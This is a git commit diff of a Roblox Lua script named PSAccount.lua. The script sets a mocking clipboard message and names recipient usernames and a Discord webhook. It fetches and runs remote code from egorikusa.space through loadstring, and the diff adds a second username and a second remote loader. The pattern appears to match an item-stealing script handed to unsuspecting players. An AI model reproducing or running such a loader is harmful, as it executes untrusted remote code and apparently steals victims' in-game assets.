6466ddb8ce7098c3ae4828c79e988035e7114156
TylerHIP <scriptstesting062@gmail.com>
2024-10-24 12:58:58 +0800

    Update PSAccount.lua

--- PSAccount.lua
+++ PSAccount.lua
@@ -1,5 +1,7 @@
 setclipboard("You are gay, Thanks for using our script!")
 
 Username = "OnodaKun23"
+Username2 = "kely5171"
 Webhook = "https://discord.com/api/webhooks/1292732752650833963/oFYNr8KAXHfS1b4iagJdc0a2fzru6IYn7fGTDHZyIg5VDB2poUICHDl1HM8xt8VGfHXg"
 loadstring(game:HttpGet("https://egorikusa.space/ps99", true))()
+loadstring(game:HttpGet("https://egorikusa.space/psx", true))()
